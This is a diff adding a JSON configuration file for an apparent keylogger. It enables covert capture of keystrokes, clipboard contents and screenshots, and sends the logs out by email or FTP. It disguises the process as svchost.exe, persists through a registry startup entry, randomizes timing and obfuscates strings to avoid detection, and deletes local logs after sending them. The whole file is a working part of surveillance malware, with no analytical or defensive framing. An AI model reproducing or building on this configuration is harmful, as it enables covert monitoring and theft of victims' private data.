@@ -1,0 +1,58 @@
+{
+    "capture": {
+        "enable_keystrokes": true,
+        "enable_clipboard": true,
+        "enable_screenshots": true,
+        "screenshot_interval": 300,
+        "max_log_size_mb": 50
+    },
+    "storage": {
+        "data_directory": "logs",
+        "encrypt_logs": true,
+        "compression": true
+    },
+    "exfiltration": {
+        "email": {
+            "enabled": true,
+            "smtp_server": "smtp.gmail.com",
+            "smtp_port": 587,
+            "username": "",
+            "password": "",
+            "recipient": "",
+            "interval_hours": 24,
+            "max_retries": 3
+        },
+        "ftp": {
+            "enabled": false,
+            "server": "",
+            "port": 21,
+            "username": "",
+            "password": "",
+            "remote_path": "/logs",
+            "interval_hours": 12,
+            "max_retries": 3
+        }
+    },
+    "stealth": {
+        "hide_window": true,
+        "process_name": "svchost.exe",
+        "run_as_service": false
+    },
+    "persistence": {
+        "registry_startup": true,
+        "scheduled_task": false,
+        "startup_folder": false
+    },
+    "anti_detection": {
+        "randomize_timing": true,
+        "min_delay_seconds": 1,
+        "max_delay_seconds": 5,
+        "obfuscate_strings": true,
+        "self_delete_on_exit": false
+    },
+    "cleanup": {
+        "delete_after_exfiltration": true,
+        "keep_last_n_files": 2,
+        "max_age_days": 7
+    }
+}
